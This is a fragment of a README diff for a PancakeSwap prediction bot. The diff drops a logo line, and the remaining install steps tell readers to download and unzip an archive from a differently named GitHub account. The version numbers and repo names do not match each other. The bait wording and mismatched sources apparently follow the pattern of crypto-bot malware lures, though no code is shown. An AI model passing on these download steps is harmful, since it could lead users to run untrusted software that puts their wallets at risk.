@@ -5,8 +5,6 @@
 
 # **🥞 PancakeSwap Prediction v3.9(21.06.2022) Bot (NO PRIVATE KEY REQUIRED!) 🤖**
 
-![PancakeSwap-Logo-Big](https://github.com/parames3010/PancakeswapPredictionBot-2022/blob/main/pancake.png)
-
 ## 💡 PancakeSwap Prediction v3.7 Bot Installation
 1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PancakeSwapPredictionBot2023/archive/master.zip). 
 2. Unzip ``master.zip``
